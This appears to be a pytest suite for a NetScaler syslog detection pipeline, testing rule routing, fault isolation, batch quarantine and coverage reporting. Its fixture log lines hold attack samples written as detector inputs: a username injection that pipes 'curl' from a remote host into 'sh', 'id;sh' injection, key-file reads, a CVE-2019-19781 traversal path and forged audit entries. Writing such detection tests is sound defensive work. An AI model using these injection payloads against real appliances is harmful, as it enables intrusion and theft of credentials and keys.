"""Live pipeline: header routing, per-line fault isolation, poison-batch quarantine, coverage."""

import json
import os
from collections.abc import Callable
from dataclasses import asdict
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

import pytest
from sqlalchemy import create_engine
from sqlalchemy.exc import DataError, OperationalError

from netrescale.collect import syslog_pipeline
from netrescale.collect.syslog_pipeline import MAX_REPLAYS, FeedHealth, SyslogPipeline
from netrescale.config import Config, Device, Paths, Syslog
from netrescale.parse.nslog import LogEvent
from netrescale.store.database import Database

NS = "<134> 2026/10/05:10:00:01 GMT ns-gw-01 0-PPE-0 : default "
HIGH_RISK = (NS + 'GUI CMD_EXECUTED 812 0 : User admin1 - Remote_ip 10.20.0.5 - '
             'Command "add system user backdoor ****" - Status "Success"')
ACCESS = '203.0.113.9 - - [05/Oct/2026:10:00:01 +0000] "{request}" 200 1 "-" "{ua}"'


class Feed:
    def __init__(self, tmp_path: Path) -> None:
        self.device = Device(name="gateway", nsip="192.0.2.10")
        self.cfg = Config(
            devices=[self.device],
            paths=Paths(state_dir=tmp_path / "state", log_dir=tmp_path / "logs",
                        vault=tmp_path / "vault", control_socket=tmp_path / "c.sock"),
            syslog=Syslog(admin_networks=["10.0.0.0/8"], admin_users=["admin1", "nsroot"]))
        self.database = Database(create_engine(f"sqlite:///{tmp_path / 'index.db'}"))
        self.database.initialize()
        self.pipeline = self.restart()
        self.path = self.cfg.paths.log_dir / "syslog" / self.device.nsip / "2026-10-05.log"
        self.path.parent.mkdir(parents=True)
        self.pending = self.cfg.paths.state_dir / "pending" / "gateway.json"

    def restart(self) -> SyslogPipeline:
        self.pipeline = SyslogPipeline(self.cfg, self.database, lambda finding: ["siem"])
        return self.pipeline

    @property
    def health(self) -> FeedHealth:
        return self.pipeline.health[self.device.name]

    def write(self, *lines: str) -> None:
        with self.path.open("ab") as stream:
            for line in lines:
                stream.write(f"2026-10-05T10:00:01+00:00 192.0.2.10 {line}\n".encode("latin-1"))

    def poll(self) -> int:
        return self.pipeline.poll(self.device)

    def findings(self) -> list[dict[str, Any]]:
        return self.database.recent_findings(datetime(2000, 1, 1, tzinfo=UTC))

    def rule_ids(self) -> set[str]:
        return {document["rule_id"] for document in self.findings()}

    def journal(self) -> dict[str, Any]:
        result: dict[str, Any] = json.loads(self.pending.read_bytes())
        return result

    def fail_ingest(self, monkeypatch: pytest.MonkeyPatch, error: Exception,
                    when: Callable[[list[Any], list[Any]], bool]) -> None:
        original = self.database.ingest

        def ingest(batch, alerts, now=None):  # type: ignore[no-untyped-def]
            if when(list(batch), list(alerts)):
                raise error
            return original(batch, alerts, now)

        monkeypatch.setattr(self.database, "ingest", ingest)


@pytest.fixture
def feed(tmp_path: Path) -> Feed:
    return Feed(tmp_path)


def test_every_management_log_reaches_its_rules_live(feed: Feed) -> None:
    feed.write(
        HIGH_RISK,
        ACCESS.format(request="POST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1", ua="curl/8"),
        "<11>[Thu Oct 05 10:00:01.123456 2026] [core:error] [pid 1234] [client 203.0.113.9:4444] "
        "AH00037: Symbolic link not allowed: /netscaler/ns_gui/vpn/a.php",
        '<13>1 2026-10-05T10:00:01Z ns-gw-01 bash 4242 - - nsroot on /dev/pts/0 '
        'shell_command="cat /flash/nsconfig/keys/updated/k1"',
        "<11>Oct  5 10:00:01 ns-gw-01 pitboss: PPE 1 missed too many heartbeats; restarting",
        "<38>Oct  5 10:00:01 ns-gw-01 sshd[812]: Accepted password for nsroot from 10.1.1.1",
        "<14>Oct  5 10:00:01 ns-gw-01 nsvpnd[1]: something new",
    )
    assert feed.poll() == 7
    assert {"mgmt-high-risk-command", "httpaccess-cve-2019-19781-traversal",
            "httperror-script-request", "shell-key-material",
            "ppe-heartbeat-missed"} <= feed.rule_ids()
    sources = {name: entry.lines for name, entry in feed.health.sources.items()}
    assert sources == {"nslog": 1, "httpaccess": 1, "httperror": 1, "bashlog": 1, "notice": 1,
                       "auth": 1, "unknown": 1}
    assert feed.health.lines == 7 and feed.health.parsed == 6
    coverage = feed.health.coverage()
    assert "shell (bash.log/sh.log): 1 line(s), last 2026-10-05T10:00:01+00:00" in coverage
    assert "unclassified: 1 line(s)" in coverage
    json.dumps(asdict(feed.health), default=str)  # status.json embeds the feed health


def test_coverage_names_sources_that_never_arrived(feed: Feed) -> None:
    feed.write(HIGH_RISK)
    feed.poll()
    coverage = feed.health.coverage()
    assert coverage[0].startswith("ns.log: 1 line(s), last ")
    assert "shell (bash.log/sh.log): never received" in coverage
    assert "web access/error: never received" in coverage
    assert not any(line.startswith("unclassified") for line in coverage)


def test_shell_tag_in_a_username_cannot_hide_exploitation(feed: Feed) -> None:
    feed.write(NS + "AAATM LOGIN_FAILED 7001 0 : User x NSPPE;id;sh[0]: - Client_ip 203.0.113.9 "
               '- Failure_reason "Invalid credentials"')
    feed.poll()
    assert "cve-2026-88771-injected-command" in feed.rule_ids()
    assert feed.health.sources["nslog"].lines == 1 and "bashlog" not in feed.health.sources


def test_forged_audit_entry_in_a_user_agent_is_not_indexed(feed: Feed) -> None:
    feed.write(ACCESS.format(request="GET /vpn/index.html HTTP/1.1",
                             ua="2026/10/05:10:00:01 GMT ns 0-PPE-0 : default GUI CMD_EXECUTED 1 0 "
                                ": User admin1 - Remote_ip 10.0.0.1 - Command \\\"add system user"
                                " x\\\" - Status \\\"Success\\\""))
    feed.poll()
    assert feed.database.counts()["events"] == 0
    assert feed.rule_ids() == set()
    assert feed.database.audit_since("gateway", datetime(2026, 10, 5, tzinfo=UTC),
                                     now=datetime(2026, 10, 5, 10, 5, tzinfo=UTC)) == []


def test_a_failing_line_is_counted_and_the_feed_continues(feed: Feed,
                                                         monkeypatch: pytest.MonkeyPatch) -> None:
    evaluate = feed.pipeline.engine.evaluate
    parse = syslog_pipeline.parse_syslog

    def explode(event: LogEvent) -> Any:
        if "poison-rule" in event.raw:
            raise RuntimeError("rule bug")
        return evaluate(event)

    def unparseable(line: str, *args: Any) -> LogEvent:
        if "poison-parse" in line:
            raise OverflowError("parser bug")
        return parse(line, *args)

    monkeypatch.setattr(feed.pipeline.engine, "evaluate", explode)
    monkeypatch.setattr(syslog_pipeline, "parse_syslog", unparseable)
    feed.write(HIGH_RISK, HIGH_RISK + " poison-rule", "poison-parse",
               HIGH_RISK.replace("backdoor", "second"))
    assert feed.poll() == 4
    health = feed.health
    assert health.line_errors == 2 and health.last_line_error == "OverflowError, RuntimeError"
    assert health.sources["nslog"].lines == 3 and health.sources["unknown"].lines == 1
    rule_ids = [document["rule_id"] for document in feed.findings()]
    assert rule_ids.count("mgmt-high-risk-command") == 2
    error = next(document for document in feed.findings()
                 if document["rule_id"] == "log-parse-error")
    assert error["severity"] == "high"
    assert error["evidence"]["errors"] == {"RuntimeError": [2], "OverflowError": [3]}
    assert error["evidence"]["raw_ref"]
    assert feed.restart().poll(feed.device) == 0  # the checkpoint advanced past the bad lines


def test_session_reuse_still_detected_live(feed: Feed) -> None:
    base = NS + "SSLVPN {ev} 1 0 : Context j@192.0.2.10 - SessionId: 77- User j - Client_ip 192.0.2.10"
    feed.write(base.format(ev="LOGIN"),
               base.format(ev="TCPCONNSTAT") + " - Source 203.0.113.66:5151 - Destination 10.1.1.1:2598")
    feed.poll()
    assert "session-reuse" in feed.rule_ids()


def test_poison_batch_is_quarantined_after_repeated_replays(feed: Feed,
                                                            monkeypatch: pytest.MonkeyPatch) -> None:
    feed.write(HIGH_RISK)
    feed.fail_ingest(monkeypatch, DataError("INSERT", {}, ValueError("value too long")),
                     lambda batch, alerts: bool(batch))
    with pytest.raises(DataError):
        feed.poll()
    assert feed.journal()["attempts"] == 0
    for attempt in range(1, MAX_REPLAYS + 1):
        with pytest.raises(DataError):
            feed.restart().poll(feed.device)
        assert feed.journal()["attempts"] == attempt
        assert feed.journal()["last_error"] == "DataError"
    assert feed.restart().poll(feed.device) == 1
    assert not feed.pending.exists()
    quarantined = list(feed.pipeline.quarantine_dir.iterdir())
    assert len(quarantined) == 1 and quarantined[0].name.startswith("gateway-")
    assert feed.health.quarantined == 1 and feed.health.last_quarantined == quarantined[0].name
    assert feed.health.lines == 1
    alert = next(document for document in feed.findings()
                 if document["rule_id"] == "syslog-batch-quarantined")
    assert alert["severity"] == "critical" and alert["category"] == "health"
    assert alert["evidence"]["batch_findings_stored"] is True
    assert alert["evidence"]["batch_rule_ids"] == ["mgmt-high-risk-command"]
    assert alert["evidence"]["attempts"] == MAX_REPLAYS and alert["evidence"]["error"] == "DataError"
    assert alert["evidence"]["raw_ref"] and alert["evidence"]["lines"] == 1
    assert "mgmt-high-risk-command" in feed.rule_ids()  # the batch's own detection survives
    monkeypatch.undo()
    feed.write(HIGH_RISK.replace("backdoor", "after"))
    assert feed.restart().poll(feed.device) == 1  # the checkpoint moved past the poison batch
    assert feed.database.counts()["events"] == 1


def test_quarantine_alert_is_stored_even_when_the_findings_are_the_poison(
        feed: Feed, monkeypatch: pytest.MonkeyPatch) -> None:
    feed.write(HIGH_RISK)
    feed.fail_ingest(monkeypatch, DataError("INSERT", {}, ValueError("bad finding")),
                     lambda batch, alerts: any(alert.rule_id == "mgmt-high-risk-command"
                                               for alert, _targets in alerts))
    for _ in range(MAX_REPLAYS + 1):
        with pytest.raises(DataError):
            feed.poll()
    assert feed.poll() == 1
    alerts = [document for document in feed.findings()]
    assert [document["rule_id"] for document in alerts] == ["syslog-batch-quarantined"]
    assert alerts[0]["evidence"]["batch_findings_stored"] is False


class PgError(Exception):
    """A DBAPI error carrying a PostgreSQL SQLSTATE, as psycopg raises it."""

    def __init__(self, sqlstate: str) -> None:
        super().__init__(f"SQLSTATE {sqlstate}")
        self.sqlstate = sqlstate


def _down(feed: Feed, monkeypatch: pytest.MonkeyPatch) -> None:
    def check() -> None:
        raise OperationalError("SELECT", {}, ConnectionRefusedError("refused"))

    monkeypatch.setattr(feed.database, "check", check)


@pytest.mark.parametrize("outage", [
    lambda feed, mp: OperationalError("INSERT", {}, PgError("08006")),
    lambda feed, mp: OperationalError("INSERT", {}, PgError("57P01")),
    lambda feed, mp: OperationalError("INSERT", {}, PgError("53100")),
    lambda feed, mp: OperationalError("INSERT", {}, PgError("40P01")),
    lambda feed, mp: OperationalError("INSERT", {}, ConnectionError("reset"),
                                      connection_invalidated=True),
    lambda feed, mp: _down(feed, mp) or OperationalError("INSERT", {}, ConnectionError("down")),
], ids=["connection", "admin-shutdown", "disk-full", "deadlock", "invalidated", "no-answer"])
def test_database_outage_never_quarantines(
        feed: Feed, monkeypatch: pytest.MonkeyPatch,
        outage: Callable[[Feed, pytest.MonkeyPatch], OperationalError]) -> None:
    feed.write(HIGH_RISK)
    feed.fail_ingest(monkeypatch, outage(feed, monkeypatch), lambda batch, alerts: True)
    for _ in range(MAX_REPLAYS + 3):
        with pytest.raises(OperationalError):
            feed.poll()
        assert feed.journal()["attempts"] == 0
    assert not feed.pipeline.quarantine_dir.exists()
    monkeypatch.undo()
    assert feed.poll() == 1 and not feed.pending.exists()
    assert "mgmt-high-risk-command" in feed.rule_ids()


@pytest.mark.parametrize("error", [
    OperationalError("INSERT", {}, PgError("54000")),  # index row size exceeds btree maximum
    OperationalError("INSERT", {}, PgError("57014")),  # statement timeout on every replay
    OperationalError("INSERT", {}, Exception("too many SQL variables")),  # database answers
], ids=["program-limit", "query-canceled", "answering"])
def test_deterministic_operational_error_is_quarantined(
        feed: Feed, monkeypatch: pytest.MonkeyPatch, error: OperationalError) -> None:
    feed.write(HIGH_RISK)
    feed.fail_ingest(monkeypatch, error, lambda batch, alerts: bool(batch))
    for attempt in range(MAX_REPLAYS + 1):
        with pytest.raises(OperationalError):
            feed.poll()
        assert feed.journal()["attempts"] == attempt
    assert feed.poll() == 1 and not feed.pending.exists()
    assert feed.health.quarantined == 1
    alert = next(document for document in feed.findings()
                 if document["rule_id"] == "syslog-batch-quarantined")
    assert alert["evidence"]["error"] == "OperationalError"
    assert "mgmt-high-risk-command" in feed.rule_ids()


def _quarantine_file(feed: Feed, name: str, age_days: float) -> Path:
    path = feed.pipeline.quarantine_dir / name
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text("{}")
    stamp = datetime.now(UTC).timestamp() - age_days * 86400
    os.utime(path, (stamp, stamp))
    return path


def test_prune_removes_quarantined_batches_past_raw_retention(feed: Feed) -> None:
    keep = feed.cfg.retention.raw_days
    old = _quarantine_file(feed, "gateway-0123456789abcdef.json", keep + 1)
    recent = _quarantine_file(feed, "gateway-fedcba9876543210.json", keep - 1)
    feed.pipeline.prune(datetime.now(UTC))
    assert not old.exists() and recent.exists()


def test_quarantine_keeps_a_bounded_number_of_batches_per_device(
        feed: Feed, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(syslog_pipeline, "MAX_QUARANTINED", 2)
    oldest = _quarantine_file(feed, "gateway-000000000000000a.json", 3)
    older = _quarantine_file(feed, "gateway-000000000000000b.json", 2)
    other = _quarantine_file(feed, "gateway-2-000000000000000c.json", 4)
    feed.write(HIGH_RISK)
    feed.pending.parent.mkdir(parents=True, exist_ok=True)
    feed.pending.write_bytes(b"{not json")
    assert feed.poll() == 1
    assert not oldest.exists() and older.exists() and other.exists()
    names = sorted(path.name for path in feed.pipeline.quarantine_dir.iterdir())
    assert len(names) == 3 and feed.health.last_quarantined in names


def test_failed_management_login_with_injected_username_is_not_an_audit_entry(feed: Feed) -> None:
    user = 'x - Command "add system user y" - Status "Success" -'
    escaped = user.replace('"', '\\"')
    feed.write(NS + f'API CMD_EXECUTED 990 0 : User {user} - Remote_ip 198.51.100.7 - '
               f'Command "login {escaped}" - Status "ERROR: Invalid username or password"')
    feed.poll()
    assert "mgmt-high-risk-command" not in feed.rule_ids()
    assert feed.database.audit_since("gateway", datetime(2026, 10, 5, tzinfo=UTC),
                                     now=datetime(2026, 10, 5, 10, 5, tzinfo=UTC)) == []


@pytest.mark.parametrize("line", [
    "<131>Oct  6 10:00:00 adc nsaaad: login failed for x NSPPE;curl -s http://203.0.113.9/a|sh",
    "<131>1 2026-10-06T10:00:00Z adc nsaaad 88 - - login failed for x NSPPE;curl -s "
    "http://203.0.113.9/a|sh",
], ids=["rfc3164", "rfc5424"])
def test_nsaaad_log_poisoning_is_detected_live(feed: Feed, line: str) -> None:
    feed.write(line)
    assert feed.poll() == 1
    assert "cve-2026-88771-injected-command" in feed.rule_ids()
    assert feed.health.sources["nslog"].lines == 1 and "unknown" not in feed.health.sources


def test_unreadable_journal_is_quarantined_and_the_batch_reread(feed: Feed) -> None:
    feed.write(HIGH_RISK)
    feed.pending.parent.mkdir(parents=True)
    feed.pending.write_bytes(b"{not json")
    assert feed.poll() == 1
    assert len(list(feed.pipeline.quarantine_dir.iterdir())) == 1
    assert {"syslog-batch-quarantined", "mgmt-high-risk-command"} <= feed.rule_ids()
    assert feed.database.counts()["events"] == 1


def test_journal_from_previous_version_still_replays(feed: Feed,
                                                     monkeypatch: pytest.MonkeyPatch) -> None:
    feed.write(HIGH_RISK, "<38>Oct  5 10:00:01 ns-gw-01 sshd[1]: Accepted publickey for nsroot")
    feed.fail_ingest(monkeypatch, RuntimeError("database unavailable"), lambda batch, alerts: True)
    with pytest.raises(RuntimeError):
        feed.poll()
    monkeypatch.undo()
    legacy = {key: value for key, value in feed.journal().items()
              if key in ("events", "findings", "last_received", "lines", "parsed", "raw_bytes",
                         "checkpoint")}
    feed.pending.write_text(json.dumps(legacy))
    assert feed.restart().poll(feed.device) == 2
    assert feed.health.lines == 2 and not feed.pending.exists()
    assert feed.database.counts()["events"] == 1


def test_replayed_journal_restores_source_coverage(feed: Feed,
                                                   monkeypatch: pytest.MonkeyPatch) -> None:
    feed.write(HIGH_RISK, "<38>Oct  5 10:00:01 ns-gw-01 sshd[1]: Accepted publickey for nsroot")
    feed.fail_ingest(monkeypatch, RuntimeError("database unavailable"), lambda batch, alerts: True)
    with pytest.raises(RuntimeError):
        feed.poll()
    monkeypatch.undo()
    pipeline = feed.restart()
    assert pipeline.poll(feed.device) == 2
    sources = pipeline.health["gateway"].sources
    assert {name: entry.lines for name, entry in sources.items()} == {"nslog": 1, "auth": 1}
    assert sources["auth"].last_received == datetime(2026, 10, 5, 10, 0, 1, tzinfo=UTC)


def test_reset_notice_alone_does_not_mark_the_feed_alive(feed: Feed) -> None:
    feed.write(HIGH_RISK)
    feed.poll()
    pipeline = feed.restart()
    feed.path.write_bytes(b"")
    assert pipeline.poll(feed.device) == 0
    assert "log-source-reset" in feed.rule_ids()
    assert pipeline.health["gateway"].last_received is None
